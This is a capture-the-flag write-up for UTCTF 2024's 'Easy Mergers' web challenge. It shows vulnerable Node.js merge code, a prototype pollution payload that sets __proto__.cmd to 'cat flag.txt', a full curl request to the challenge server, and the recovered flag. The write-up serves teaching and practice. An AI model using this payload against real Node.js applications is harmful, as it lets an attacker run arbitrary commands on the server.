---
title: "Easy Mergers v0.1"
description: "Tired of getting your corporate mergers blocked by the FTC"
points: 787
solves: 143
date: April 1 2024
author: Jozef Steinhübl 
---

![easy mergers](https://raw.githubusercontent.com/GerlachSnezka/utctf/main/assets/2024-web-easymergers.png)

For this assignment, we had the page and code for this site. On the site, we can add fields and then create a company or edit it (absorb it).

![easy mergers web](https://raw.githubusercontent.com/GerlachSnezka/utctf/main/assets/2024-web-easymergers-web.png)

We'll open dev tools to see what the requests look like. We notice a very interesting thing, namely that with `absorbCompany` the request returns a JSON containing `stderr` with the message `/bin/sh: 1: ./merger.sh: Permission denied\n`. This means that the script `merger.sh` is executed on the server.

![easy mergers weird behaviour](https://raw.githubusercontent.com/GerlachSnezka/utctf/main/assets/2024-web-easymergers-weird-behaviour.png)

Thanks to the fact that we have the source code, we can take a closer look at what's going on:
```js
function isObject(obj) {
    return typeof obj === 'function' || typeof obj === 'object';
}

var secret = {}

const { exec } = require('child_process');

process.on('message', function (m) {
    let data = m.data;
    let orig = m.orig;
    for (let k = 0; k < Math.min(data.attributes.length, data.values.length); k++) {
        if (!(orig[data.attributes[k]] === undefined) && isObject(orig[data.attributes[k]]) && isObject(data.values[k])) {
            for (const key in data.values[k]) {
                orig[data.attributes[k]][key] = data.values[k][key];
            }
        } else if (!(orig[data.attributes[k]] === undefined) && Array.isArray(orig[data.attributes[k]]) && Array.isArray(data.values[k])) {
            orig[data.attributes[k]] = orig[data.attributes[k]].concat(data.values[k]);
        } else {
            orig[data.attributes[k]] = data.values[k];
        }
    }
    cmd = "./merger.sh";

    if (secret.cmd != null) {
        cmd = secret.cmd;
    }

    var test = exec(cmd, (err, stdout, stderr) => {
        retObj = {};
        retObj['merged'] = orig;
        retObj['err'] = err;
        retObj['stdout'] = stdout;
        retObj['stderr'] = stderr;
        process.send(retObj);
    });
    console.log(test);
});
```

Looking at it for the first time, we might not say there would be a bug since there is no way to replace `cmd`. However.... this is not true because of JS. In JS there is something called prototype pollution attack. For example, you can find more [here](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)

So we can exploit this attack and send a POST request with this body:
```json
{
  "attributes": ["__proto__"],
  "values": [{ "cmd": "cat flag.txt" }]
}
```

The `flag.txt` probably exists, since it is also in our codebase.

```sh
#!/bin/bash

curl 'http://guppy.utctf.live:8725/api/absorbCompany/0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-GB,en;q=0.9,sk-SK;q=0.8,sk;q=0.7,en-US;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: connect.sid=YOURSID' \
  -H 'Origin: http://guppy.utctf.live:8725' \
  -H 'Referer: http://guppy.utctf.live:8725/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36' \
  --data-raw '{"attributes":["__proto__"],"values":[{"cmd": "cat flag.txt"}]}' \
  --insecure
```

And we get the flag in the stdout field:
```
utflag{p0lluted_b4ckdoorz_and_m0r3}
```